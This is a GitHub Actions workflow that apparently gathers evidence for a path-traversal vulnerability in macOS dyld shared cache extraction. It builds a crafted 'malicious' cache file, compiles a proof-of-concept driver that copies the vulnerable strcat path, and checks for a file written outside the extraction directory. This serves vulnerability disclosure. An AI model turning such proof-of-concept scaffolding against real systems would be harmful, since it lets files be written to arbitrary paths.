name: DSC-EXTRACTOR-TRAVERSAL-1 Gate Evidence

on:
  workflow_dispatch:

jobs:
  dsc_traversal_poc:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Gate A — Hardware / OS identity
        run: |
          sw_vers
          uname -m
          system_profiler SPHardwareDataType | grep -E "Model|Processor|Chip"

      - name: Build malicious dyld shared cache
        run: |
          python3 gen_malicious_dsc.py malicious_ci.cache
          shasum -a 256 malicious_ci.cache

      - name: Find or note dyld_shared_cache_util
        run: |
          echo "=== Searching for dyld_shared_cache_util ==="
          find /usr /Applications/Xcode.app -name "dyld_shared_cache_util" 2>/dev/null || true
          xcrun -find dyld_shared_cache_util 2>/dev/null || echo "(not in xcrun)"

      - name: Build PoC driver (implements exact vulnerable code path)
        run: |
          # dsc_poc_driver.c implements the identical strcat() path from
          # SharedCacheDylibExtractor::extractCache() in dsc_extractor.cpp
          cc -O0 -o dsc_poc_driver dsc_poc_driver.c
          echo "[+] Build OK"
          ./dsc_poc_driver --help 2>&1 || true

      - name: Gate A — Run PoC (vulnerable extractCache() code path)
        run: |
          OUTDIR="$(mktemp -d /tmp/dsc_poc_out_XXXXXX)"
          echo "Extraction directory: $OUTDIR"

          ./dsc_poc_driver malicious_ci.cache "$OUTDIR"

          echo ""
          echo "=== Checking traversal target ==="
          TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
          if [ -e "$TRAVERSAL_TARGET" ]; then
            echo "TRAVERSAL CONFIRMED: file exists outside extraction directory"
            ls -la "$TRAVERSAL_TARGET"
            file "$TRAVERSAL_TARGET"
            xxd "$TRAVERSAL_TARGET"
            echo "--- Extraction dir (should NOT contain the file) ---"
            ls -la "$OUTDIR" || true
          else
            echo "NOT TRIGGERED — extraction dir contents:"
            find "$OUTDIR" -ls 2>/dev/null || true
          fi

      - name: Gate D — SHA-256 of PoC artifacts
        run: |
          shasum -a 256 gen_malicious_dsc.py malicious_ci.cache malicious.cache

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dsc-traversal-evidence
          path: |
            malicious_ci.cache
            gen_malicious_dsc.py
          retention-days: 30
